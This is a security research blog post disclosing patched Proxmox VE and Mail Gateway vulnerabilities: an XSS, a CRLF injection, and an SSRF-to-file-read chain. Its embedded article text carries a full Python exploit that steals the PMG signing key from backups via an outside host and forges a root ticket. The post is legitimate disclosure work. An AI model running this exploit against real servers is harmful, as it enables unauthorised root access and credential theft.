<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Multiple Vulnerabilities in Proxmox VE &amp; Proxmox Mail Gateway | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Background Proxmox Virtual Environment (Proxmox VE or PVE) is an open-source type-1 hypervisor. It includes a web-based management interface programmed in Perl. Another Proxmox product written in Perl, Proxmox Mail Gateway (PMG), comes with a similar web management interface. They share some of the codebases.
In this article, I will introduce how to debug PVE&rsquo;s web service step-by-step and analyse three bugs I have found in PVE and PMG.
[UPDATE] This is a quick and minor update to this blog post.">
<meta name="author" content="Li JianTao (@cursered)">
<link rel="canonical" href="https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="Multiple Vulnerabilities in Proxmox VE &amp; Proxmox Mail Gateway" />
<meta property="og:description" content="Background Proxmox Virtual Environment (Proxmox VE or PVE) is an open-source type-1 hypervisor. It includes a web-based management interface programmed in Perl. Another Proxmox product written in Perl, Proxmox Mail Gateway (PMG), comes with a similar web management interface. They share some of the codebases.
In this article, I will introduce how to debug PVE&rsquo;s web service step-by-step and analyse three bugs I have found in PVE and PMG.
[UPDATE] This is a quick and minor update to this blog post." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2022-12-02T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2022-12-02T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="Multiple Vulnerabilities in Proxmox VE &amp; Proxmox Mail Gateway"/>
<meta name="twitter:description" content="Background Proxmox Virtual Environment (Proxmox VE or PVE) is an open-source type-1 hypervisor. It includes a web-based management interface programmed in Perl. Another Proxmox product written in Perl, Proxmox Mail Gateway (PMG), comes with a similar web management interface. They share some of the codebases.
In this article, I will introduce how to debug PVE&rsquo;s web service step-by-step and analyse three bugs I have found in PVE and PMG.
[UPDATE] This is a quick and minor update to this blog post."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "https://starlabs.sg/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Multiple Vulnerabilities in Proxmox VE \u0026 Proxmox Mail Gateway",
      "item": "https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Multiple Vulnerabilities in Proxmox VE \u0026 Proxmox Mail Gateway",
  "name": "Multiple Vulnerabilities in Proxmox VE \u0026 Proxmox Mail Gateway",
  "description": "Background Proxmox Virtual Environment (Proxmox VE or PVE) is an open-source type-1 hypervisor. It includes a web-based management interface programmed in Perl. Another Proxmox product written in Perl, Proxmox Mail Gateway (PMG), comes with a similar web management interface. They share some of the codebases.\nIn this article, I will introduce how to debug PVE\u0026rsquo;s web service step-by-step and analyse three bugs I have found in PVE and PMG.\n[UPDATE] This is a quick and minor update to this blog post.",
  "keywords": [
    
  ],
  "articleBody": "Background Proxmox Virtual Environment (Proxmox VE or PVE) is an open-source type-1 hypervisor. It includes a web-based management interface programmed in Perl. Another Proxmox product written in Perl, Proxmox Mail Gateway (PMG), comes with a similar web management interface. They share some of the codebases.\nIn this article, I will introduce how to debug PVE’s web service step-by-step and analyse three bugs I have found in PVE and PMG.\n[UPDATE] This is a quick and minor update to this blog post. MITRE email back to us on 9th December 2022 assigned CVE-2022-35507 \u0026 CVE-2022-35508 for the remaining 2 bugs\nGreatly appreciate MITRE for getting back to us.\nLocating the source code PVE is a Debian-based Linux distribution. The ISO installer is available at their website. Do note that if you would like to reproduce any of the bugs in this article, please use “Proxmox VE 7.2 ISO Installer” updated on 04 May 2022, which does not include the patches unless you run apt update manually.\nIn a default installation, the web service should listen on port 8006.\nWith a few commands, it is not difficult to figure out that the scripts of the web service are located in /usr/share/perl5/:\nss -natlp | grep 8006 # Which process is listening on port 8006\rwhich pveproxy # Where is the executable\rhead `which pveproxy` # Is it an ELF, a shell script or something else?\rfind /usr -name \"SafeSyslog*\" # Where is the \"SafeSyslog\" module used by pveproxy? Setting up debug environment I choose IntelliJ IDEA and its Perl plugin for debugging. Here are the steps to set it up:\nIn IDEA  Pack /usr/share/perl5/ on the PVE server and open it as Project in IDEA Go to Settings  Plugins and install Perl plugin Go to Settings  Languages \u0026 Frameworks  Perl5,  Select a Perl5 Interpreter (both Local and Docker would work), then Set Target version to v5.32, the same perl --version as PVE uses   In Project window (Alt+1), right click on perl5 directory, Mark Directory as  Perl5 Library Root.  At this stage, you should have correct syntax highlighting and dependency resolving in IDEA.\nGo to Run  Edit Configurations, add a new “Perl Remote Debugging” entry and save:  Name: PVE remote Remote project root: /usr/share/perl5 Connection mode: IDE connects to the perl process Server host: your PVE server IP Server port: 12345    On the PVE server Run these commands to install the required debug tools:\napt install gcc make\rcpan Devel::Camelcadedb All set. To start a debug session, click Run  Debug 'PVE remote' in IDEA and run PERL5_DEBUG_HOST=PERL5_DEBUG_PORT=12345 PERL5_DEBUG_ROLE=server perl -T -d:Camelcadedb /usr/bin/pveproxy start -debug on the server. If everything goes well, the debugger should break at line 330 of SSL.pm by default, as shown in the image below.\nBug 0x01: Post-auth XSS in API inspector By logging in to the web interface, it can be observed that a lot of requests are sent to endpoints under the path /api2/json/. Usually, json after /api indicates the format the response data is in, and the server might support various formats for different purposes. For example, xml might be implemented for RPC calls, jsonp for cross-origin  tags, or html for setting innerHTML. In PVE, if we change json to html, the server will return an “API Inspector” page containing the json result:\nFurther testing shows that the server does not properly escape user’s input. If we visit a non-existent API endpoint, the request path will be reflected in the href attribute of an  tag. As such, an attacker can inject HTML tags to achieve reflected cross-site scripting.\nFurther Analysis The function handle_request at perl5/PVE/APIServer/AnyEvent.pm line 1100 is our entry point. If the request path starts with /api2, it will pass the request on to function handle_api2_request.\nStepping into handle_api2_request, we can see at line 865 the variables $rel_uri and $format are extracted from the rest of the request path by a regex. Then function PVE::APIServer::Formatter::get_formatter is called to get a “formatter” for generating the response. Later on, the $formatter is called at line 946. When generating the “breadcrumb” HTML of the navigation bar, the request path is directly concatenated to the href attribute of the  tag.\nImpacts, attack conditions \u0026 constraints Since the authentication cookie PVEAuthCookie is set with the Session attribute, successful exploitation requires the victim to be logged in to the web interface in the same browser session before he visits the malicious link.\nAn attacker can access every functionality in the web interface by executing malicious JavaScript code. One of the features is to execute shell commands. Here is a video demonstrating a possible attack scenario. In the video, the victim logged in to PVE web UI, and then visited a link. A reverse shell of the PVE host was spawned on the attacker’s machine.\n  Patch This vulnerability is patched by encoding user inputs to HTML entities in pve-http-server version 4.1-2.\nBug 0x02: CRLF injection in response headers While handling HTTP requests, if there is any error, the PVE server will write the error message in the status line of the response.\nThe corresponding code is located in perl5/PVE/APIServer/AnyEvent.pm:\n# line 294 my $code = $resp-code; my $msg = $resp-message || HTTP::Status::status_message($code); ($msg) = $msg =~m/^(.*)$/m; # [1] # ... # line 308 my $proto = $reqstate-{proto} ? $reqstate-{proto}-{str} : 'HTTP/1.0'; my $res = \"$proto $code $msg\\015\\012\"; # [2] At [1] the server uses a regex to match the first line of the error message, trying to avoid additional lines breaking the HTTP response at [2]. However, this method only prevents LF(%0a). It’s still possible to inject response headers with CR(%0d) in Chromium-based browsers.\nThis is what the response looks like in Burp Suite:\nImpacts, attack conditions \u0026 constraints At the time of testing, using CR(%0d) to inject response headers only works on Chromium-based browsers (Chrome, MS Edge, Opera, etc.), and it is not possible to inject into the response body using only CR(%0d). Firefox does not recognise CR(%0d) as a valid newline indicator without LF(%0a).\nThis bug in PVE might seem completely harmless at first sight. Unfortunately, at AnyEvent.pm line 1327, there is a length limit check for incoming HTTP requests. If a request header exceeds 8192 bytes, the server will reject to process the HTTP request.\n# line 55 my $limit_max_header_size = 8*1024; # ... # line 1327 die \"http header too large\\n\" if ($state-{size} += length($line)) = $limit_max_header_size; As such, an attacker could craft a malicious webpage to set long cookies on the victim’s PVE domain multiple times. Once the victim visits the malicious webpage, subsequent HTTP requests to the PVE domain will carry a very long cookie header and thus be rejected by the server.\nHere is a video to demonstrate this client-side DoS vulnerability. In the video, the victim was able to use PVE web UI at first. After visiting a malicious link, the victim can no longer access the web UI until he clears the cookies.\n  One thing to note is that Chrome allows third-party cookies by default. This is a necessary condition to exploit this client-side DoS bug since we are setting cookies from the attacker’s domain to the victim’s PVE domain. However, if the victim has changed their cookie policy to “Block third-party cookies” or “Block all cookies (not recommended)” in browser settings, this attack will not work.\nPatch This bug is patched by adding an additional check of \\r\\n in pve-http-server version 4.1-3.\nBug 0x03: Post-auth SSRF + LFI + Privilege Escalation SSRF A PVE server can run as a standalone node or join a cluster to connect with other nodes. This design naturally allows nodes to exchange information with each other. For instance, the api /api2/json/nodes/{node_name}/status is meant for querying the status of a node in the cluster by its name. It can also be used to query on the node itself.\nIf we change the node_name to a nonexistent value “test”, we will see this error message: HTTP/1.1 500 hostname lookup 'test' failed - failed to get address info for: test: No address associated with hostname. It seems that the server is trying to perform a DNS lookup on the given node_name. A quick test using Burp Collaborator verifies our guess:\nBy step debugging, we are able to locate the corresponding code in AnyEvent.pm:proxy_request. It turns out that the server resolves node_name to IP address and then relays our HTTP request to https://{IP}:8006/api2/json/nodes/{node_name}/status.\nOne thing we might want to try here is to setup our own HTTPS server to listen on port 8006 with a valid SSL certificate and observe whether the relayed request could come in. While it does not work like that because there are multiple checks performed before firing the request and one of them is expecting /etc/pve/nodes/{node_name}/pve-ssl.pem to be found for every node in the cluster. Whether we input our own domain name or IP address, the server will never find the cert file since the node_name does not point to any real node in the cluster. So it just throws the error “HTTP/1.1 596 tls_process_server_certificate: certificate verify failed” during TLS handshake and stops there.\nAnother thing we notice is that $uri is appended to the port (line 699, 703 and 705 in the image above) when constructing the $target URL. The developers might have assumed that $uri will always start with a slash(/). While that is not true as we find out that it is possible to replace slash(/) with its URL-encoded form %2F without breaking the request parser.\nWe tried to turn the starting part of the URL into userinfo and append our own domain by using the at sign (@), but one of the sanity checks blocked us again. After several attempts, we managed to find a suitable API to exploit this SSRF vulnerability: GET /api2/json/nodes/{node_name}/tasks/{upid}/log. This API accepts any string as upid, which means we can set node_name to a valid node so that it won’t fail for certificate issues. Then we use URL-encoded slashes and @ to control the hostname.\nAn authenticated user without any permissions in PVE is able to perform this SSRF attack. Due to the large shared codebases between PVE and PMG, an authenticated user in PMG that only has a low privilege “Help Desk” role or “Audit” role can also exploit this SSRF vulnerability using API /api2/html/nodes/{node_name}/pbs/{remote}/snapshot/.\nArbitrary file read Inside the callback function of http_request, the server looks for the pvestreamfile header in response headers (line 778) and extracts its value to the variable $stream. $stream is later passed to sysopen, and the server will return the content of the file as the response body.\nThe vulnerable code exists in PMG as well. An attacker can exploit the SSRF vulnerability presented earlier to read arbitrary files on PVE/PMG servers with only a non-privileged account in PVE or a low-privilege account in PMG. The sysopen is called in process “pve(pmg)proxy worker” with uid=33(www-data).\nPrivilege escalation in PMG via unsecured backup file With the ability to read an arbitrary file, hackers might be particularly interested in credentials and secret keys stored on the server. We decided to dig into the implementation of the authentication process to see whether the server stores anything in the database or in the config file, in plaintext or encrypted by some “secret keys”.\nAuthentication in PVE/PMG is implemented by signing and verifying a string using RSA/SHA-1. Upon successful login, the server will sign a “ticket” for client, as known as “PVEAuthCookie” or “PMGAuthCookie”. Here is a sample of the ticket:\nPVE:user01@pve:62BD5976::L1CM303sdb4Lr8yFOxFbw7KNYQ2SKI6LugQJj0+JDBpTG3L2QBBMQTe8Q2/VgECWumE8OyjB1ff15GIMLnHAnOTdGeRUbntaMQhU5kHr6TZsAbRRzZ6MTBqkFTq0lJUcK86BcNpHUaciABVEEjVvgDnOOToJXSMvM/qxzmiusTrx5wpturrF1D8hmhay2sG9eEuKwXVsIb6aeBL0Vcwm7V8VUQ0qqnUyaArAaJ4eW1MLIXgHl23OySYEl3CMg5mdbHyn+B0ITz8N4mYWXA2BedVxwE1Uo6NltJDsd63Mgob7ey9xmZSQI2M9qrLZIIhPbfK6panXJBvuCqAILZKjmw== The double colon seperates the plaintext and signature. The format of plaintext is PVE:{username}@{realm}:{hex(timestamp)} . While the signature is generated using private key stored at /etc/pve/priv/authkey.key for PVE, or /etc/pmg/pmg-authkey.key for PMG, only root user has read-write permissions to these files.\nroot@pve7:~# ls -l /etc/pve/priv/authkey.key -rw------- 1 root www-data 1675 Jun 30 10:52 /etc/pve/priv/authkey.key root@pmg:~# ls -l /etc/pmg/pmg-authkey.key -rw------- 1 root root 1679 Jun 9 11:43 /etc/pmg/pmg-authkey.key However, it turns out that if the backup feature in PMG has ever been used, the backup file will contain the authkey. More importantly, it is readable by www-data users:\nroot@pmg:/var/lib/pmg/backup# ls -l total 12 -rw-r--r-- 1 root root 10799 Jun 9 17:16 pmg-backup_2022_06_09_62A1BA65.tgz The path to the backup file can be extracted from task logs which is also accessible by www-data user. Combining all the vulnerabilities above, an attacker can forge a ticket to achieve privilege escalation from a low privilege “Help Desk” role or “Audit” role to \"root@pam\" for full access in PMG.\nProof-of-concept We have attached the python script below and a video demonstrating this exploit. In the video, the attacker logged in to PMG web UI as a “Help Desk” user and was not able to change the current user’s role due to low privilege. After running the exploit, a forged ticket was generated, and the attacker gained access to the web UI as \"root@pam\" user.\n  import argparse import requests import logging import json import socket import ssl import urllib.parse import re import time import subprocess import base64 import tarfile import io import tempfile import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) PROXIES = {} # {'https': '192.168.86.52:8080'} logging.basicConfig(format='%(asctime)s- %(message)s', level=logging.INFO) def generate_ticket(authkey_bytes, username='root@pam', time_offset=-30): timestamp = hex(int(time.time()) + time_offset)[2:].upper() plaintext = f'PMG:{username}:{timestamp}' authkey_path = tempfile.NamedTemporaryFile(delete=False) logging.info(f'writing authkey to {authkey_path.name}') authkey_path.write(authkey_bytes) authkey_path.close() txt_path = tempfile.NamedTemporaryFile(delete=False) logging.info(f'writing plaintext to {txt_path.name}') txt_path.write(plaintext.encode('utf-8')) txt_path.close() logging.info(f'calling openssl to sign') sig = subprocess.check_output( ['openssl', 'dgst', '-sha1', '-sign', authkey_path.name, '-out', '-', txt_path.name]) sig = base64.b64encode(sig).decode('latin-1') ret = f'{plaintext}::{sig}' logging.info(f'generated ticket for {username}: {ret}') return ret def read_file(hostname, port, ticket, localhostname, filename): logging.info(f'reading {filename}') raw_req = f'GET %2Fapi2%2Fhtml%2Fnodes%2F{localhostname}%2Fpbs%2F@t7.cal1.cn/snapshot/?f={urllib.parse.quote_plus(filename)}HTTP/1.1\\r\\n' \\ f'Cookie: PMGAuthCookie={urllib.parse.quote_plus(ticket)}\\r\\n' \\ 'Connection: close\\r\\n' \\ '\\r\\n' logging.debug(raw_req) context = ssl.create_default_context() # disable cert check context.check_hostname = False context.verify_mode = ssl.VerifyMode.CERT_NONE ret = b'' with socket.create_connection((hostname, port), timeout=5) as sock: with context.wrap_socket(sock, server_hostname=hostname) as ssock: ssock.send(raw_req.encode()) while True: try: buf = ssock.recv(2048) ret += buf if (len(buf)  1): break logging.info(f'recv {len(buf)}bytes') except socket.timeout: logging.error('recv timeout, maybe the file doesn\\'t exist') break return ret def get_authkey_from_tgz(tgz_bytes): tar = tarfile.open(fileobj=io.BytesIO(tgz_bytes)) logging.info('reading ./config_backup.tar from tgz') tar2 = tarfile.open(fileobj=tar.extractfile(tar.getmember('./config_backup.tar'))) logging.info('reading etc/pmg/pmg-authkey.key from ./config_backup.tar') authkey_bytes = tar2.extractfile(tar2.getmember('etc/pmg/pmg-authkey.key')).read() logging.info(f'read authkey_bytes length: {len(authkey_bytes)}') return authkey_bytes def exploit(username, password, realm, target_url, generate_for): # login logging.info(f'logging in with username:{username}') req = requests.post(f'{target_url}api2/extjs/access/ticket', verify=False, data={'username': username, 'password': password, 'realm': realm}, proxies=PROXIES) if req.status_code != 200: logging.error(f'login failed: expect 200, got {req.status_code}. Please check target_url') exit(1) res = json.loads(req.content.decode('utf-8')) if res['success'] != 1: logging.error(f'login failed: {res[\"message\"]}. Please check username/password/realm') exit(1) ticket = res['data']['ticket'] localhostname_re = re.compile('PMG:.*?@(.*?):[0-9A-F]{8}::') localhostname = localhostname_re.findall(ticket)[0] logging.info(f'logged in, user: {res[\"data\"][\"username\"]}, role: {res[\"data\"][\"role\"]}, localhostname: {localhostname}') # read file parsed_target = urllib.parse.urlparse(target_url) hostname = parsed_target.hostname port = parsed_target.port task_index = read_file(hostname, port, ticket, localhostname, '/var/log/pve/tasks/index').decode('utf-8') task_index = task_index.split('\\r\\n\\r\\n')[1] backup_re = re.compile('^(UPID:.*?:backup::.*?) ([0-9A-F]{8}) OK$', re.MULTILINE) backup_tasks = backup_re.findall(task_index) # we start looking for the tgz file from the lastest update backup_tasks.reverse() logging.info(f'found {len(backup_tasks)}successful backup tasks') for i in backup_tasks: # extract backup tgz filepath from task details task_detail = read_file(hostname, port, ticket, localhostname, f'/var/log/pve/tasks/{i[1][-1]}/{i[0]}').decode('utf-8') backuptgz_re = re.compile('^starting backup to: (.*?\\.tgz)$', re.MULTILINE) backuptgz_path = backuptgz_re.findall(task_detail) if len(backuptgz_path) == 0: logging.info(f'no backup file') continue backuptgz_path = backuptgz_path[0] logging.info(f'found backup file: {backuptgz_path}') # read the backup tgz file and extract pmg-authkey.key backuptgz_content = read_file(hostname, port, ticket, localhostname, backuptgz_path) if not backuptgz_content: logging.info(f'no backup file') continue backuptgz_content = backuptgz_content.split(b'\\r\\n\\r\\n', 1)[1] authkey_bytes = get_authkey_from_tgz(backuptgz_content) new_ticket = generate_ticket(authkey_bytes, username=generate_for) logging.info('veryfing ticket') req = requests.get(target_url, headers={'Cookie': f'PMGAuthCookie={new_ticket}'}, proxies=PROXIES, verify=False) res = req.content.decode('utf-8') verify_re = re.compile('UserName: \\'(.*?)\\',\\n\\s+CSRFPreventionToken:') verify_result = verify_re.findall(res) logging.info(f'current user: {verify_result[0]}') logging.info(f'Cookie: PMGAuthCookie={urllib.parse.quote_plus(new_ticket)}') break def _parse_args(): parser = argparse.ArgumentParser() parser.add_argument('-u', metavar='username', required=True, help='A low privilege account in PMG') parser.add_argument('-p', metavar='password', required=True) parser.add_argument('-r', metavar='realm', default=\"pmg\", help=\"Default: pmg\") parser.add_argument('-g', metavar='generate_for', default=\"root@pam\", help=\"Default: root@pam\") parser.add_argument('-t', metavar='target_url', help='Please keep the trailing slash, example: https://10.0.0.24:8006/', required=True) return parser.parse_args() if __name__ == '__main__': arg = _parse_args() exploit(arg.u, arg.p, arg.r, arg.t, arg.g) Patch There are several commits applied in pve-http-server version 4.1-3 to fix the bug chain.\n https://git.proxmox.com/?p=pve-http-server.git;a=commitdiff;h=580d540ea907ba15f64379c5bb69ecf1a49a875f https://git.proxmox.com/?p=pve-http-server.git;a=commitdiff;h=e9df8a6e76b2a18f89295a5d92a62177bbf0f762 https://git.proxmox.com/?p=pve-http-server.git;a=commitdiff;h=c2bd69c7b5e9c775f96021cf8ae53da3dbd9029d  Timeline  2022-05-17 Reported the XSS vulnerability to vendor 2022-05-17 Vendor acknowledged and patched XSS 2022-06-16 CVE-2022-31358 assigned to the XSS vulnerability 2022-07-01 Reported CRLF injection and SSRF to vendor 2022-07-02 Vendor acknowledged and patched both vulnerabilities 2022-07-06 Submitted CVE ID request form for CRLF injection and SSRF, no reply from MITRE since then 2022-09-03 Emailed MITRE but no reply again 2022-12-09 MITRE emailed back and assigned CVE-2022-35507 \u0026 CVE-2022-35508 for the remaining 2 bugs  ",
  "wordCount" : "2708",
  "inLanguage": "en",
  "datePublished": "2022-12-02T00:00:00Z",
  "dateModified": "2022-12-02T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Li JianTao (@cursered)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/blog/">Blogs</a></div>
    <h1 class="post-title">
      Multiple Vulnerabilities in Proxmox VE &amp; Proxmox Mail Gateway
    </h1>
    <div class="post-meta"><span title='2022-12-02 00:00:00 +0000 UTC'>December 2, 2022</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;Li JianTao (@cursered)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#background" aria-label="Background">Background</a></li>
                <li>
                    <a href="#locating-the-source-code" aria-label="Locating the source code">Locating the source code</a></li>
                <li>
                    <a href="#setting-up-debug-environment" aria-label="Setting up debug environment">Setting up debug environment</a><ul>
                        
                <li>
                    <a href="#in-idea" aria-label="In IDEA">In IDEA</a></li>
                <li>
                    <a href="#on-the-pve-server" aria-label="On the PVE server">On the PVE server</a></li></ul>
                </li>
                <li>
                    <a href="#bug-0x01-post-auth-xss-in-api-inspector" aria-label="Bug 0x01: Post-auth XSS in API inspector">Bug 0x01: Post-auth XSS in API inspector</a><ul>
                        
                <li>
                    <a href="#further-analysis" aria-label="Further Analysis">Further Analysis</a></li>
                <li>
                    <a href="#impacts-attack-conditions--constraints" aria-label="Impacts, attack conditions &amp;amp; constraints">Impacts, attack conditions &amp; constraints</a></li>
                <li>
                    <a href="#patch" aria-label="Patch">Patch</a></li></ul>
                </li>
                <li>
                    <a href="#bug-0x02-crlf-injection-in-response-headers" aria-label="Bug 0x02: CRLF injection in response headers">Bug 0x02: CRLF injection in response headers</a><ul>
                        
                <li>
                    <a href="#impacts-attack-conditions--constraints-1" aria-label="Impacts, attack conditions &amp;amp; constraints">Impacts, attack conditions &amp; constraints</a></li>
                <li>
                    <a href="#patch-1" aria-label="Patch">Patch</a></li></ul>
                </li>
                <li>
                    <a href="#bug-0x03-post-auth-ssrf--lfi--privilege-escalation" aria-label="Bug 0x03: Post-auth SSRF &#43; LFI &#43; Privilege Escalation">Bug 0x03: Post-auth SSRF + LFI + Privilege Escalation</a><ul>
                        
                <li>
                    <a href="#ssrf" aria-label="SSRF">SSRF</a></li>
                <li>
                    <a href="#arbitrary-file-read" aria-label="Arbitrary file read">Arbitrary file read</a></li>
                <li>
                    <a href="#privilege-escalation-in-pmg-via-unsecured-backup-file" aria-label="Privilege escalation in PMG via unsecured backup file">Privilege escalation in PMG via unsecured backup file</a><ul>
                        
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-concept">Proof-of-concept</a></li></ul>
                </li>
                <li>
                    <a href="#patch-2" aria-label="Patch">Patch</a></li></ul>
                </li>
                <li>
                    <a href="#timeline" aria-label="Timeline">Timeline</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="background">Background<a hidden class="anchor" aria-hidden="true" href="#background">#</a></h2>
<p>Proxmox Virtual Environment (Proxmox VE or PVE) is an open-source type-1 hypervisor. It includes a web-based management interface programmed in Perl. Another Proxmox product written in Perl, Proxmox Mail Gateway (PMG), comes with a similar web management interface. They share some of the codebases.</p>
<p>In this article, I will introduce how to debug PVE&rsquo;s web service step-by-step and analyse three bugs I have found in PVE and PMG.</p>
<p><strong>[UPDATE] This is a quick and minor update to this blog post. MITRE email back to us on 9th December 2022 assigned CVE-2022-35507 &amp; CVE-2022-35508 for the remaining 2 bugs</strong></p>
<p>Greatly appreciate MITRE for getting back to us.</p>
<h2 id="locating-the-source-code">Locating the source code<a hidden class="anchor" aria-hidden="true" href="#locating-the-source-code">#</a></h2>
<p>PVE is a Debian-based Linux distribution. The ISO installer is available at <a href="https://www.proxmox.com/en/downloads">their website</a>. Do note that if you would like to reproduce any of the bugs in this article, please use &ldquo;Proxmox VE 7.2 ISO Installer&rdquo; updated on 04 May 2022, which does not include the patches unless you run <code>apt update</code> manually.</p>
<p>In a default installation, the web service should listen on port 8006.</p>
<p><img loading="lazy" src="/blog/2022/images/01.png" alt=""  />
</p>
<p>With a few commands, it is not difficult to figure out that the scripts of the web service are located in <code>/usr/share/perl5/</code>:</p>
<pre tabindex="0"><code>ss -natlp | grep 8006           # Which process is listening on port 8006
which pveproxy                  # Where is the executable
head `which pveproxy`           # Is it an ELF, a shell script or something else?
find /usr -name &#34;SafeSyslog*&#34;   # Where is the &#34;SafeSyslog&#34; module used by pveproxy?
</code></pre><p><img loading="lazy" src="/blog/2022/images/02.png" alt=""  />
</p>
<h2 id="setting-up-debug-environment">Setting up debug environment<a hidden class="anchor" aria-hidden="true" href="#setting-up-debug-environment">#</a></h2>
<p>I choose IntelliJ IDEA and its Perl plugin for debugging. Here are the steps to set it up:</p>
<h3 id="in-idea">In IDEA<a hidden class="anchor" aria-hidden="true" href="#in-idea">#</a></h3>
<ol>
<li>Pack <code>/usr/share/perl5/</code> on the PVE server and open it as Project in IDEA</li>
<li>Go to <em>Settings &gt; Plugins</em> and install <em>Perl</em> plugin</li>
<li>Go to <em>Settings &gt; Languages &amp; Frameworks &gt; Perl5</em>,
<ul>
<li>Select a <em>Perl5 Interpreter</em> (both <em>Local</em> and <em>Docker</em> would work), then</li>
<li>Set <em>Target version</em> to v5.32, the same <code>perl --version</code> as PVE uses</li>
</ul>
</li>
<li>In Project window (Alt+1), right click on <code>perl5</code> directory, <em>Mark Directory as &gt; Perl5 Library Root</em>.</li>
</ol>
<p>At this stage, you should have correct syntax highlighting and dependency resolving in IDEA.</p>
<p><img loading="lazy" src="/blog/2022/images/03.png" alt=""  />
</p>
<ol start="5">
<li>Go to <em>Run &gt; Edit Configurations</em>, add a new &ldquo;Perl Remote Debugging&rdquo; entry and save:
<ul>
<li>Name: PVE remote</li>
<li>Remote project root: <code>/usr/share/perl5</code></li>
<li>Connection mode: <code>IDE connects to the perl process</code></li>
<li>Server host: your PVE server IP</li>
<li>Server port: 12345</li>
</ul>
</li>
</ol>
<p><img loading="lazy" src="/blog/2022/images/04.png" alt=""  />
</p>
<h3 id="on-the-pve-server">On the PVE server<a hidden class="anchor" aria-hidden="true" href="#on-the-pve-server">#</a></h3>
<p>Run these commands to install the required debug tools:</p>
<pre tabindex="0"><code>apt install gcc make
cpan Devel::Camelcadedb
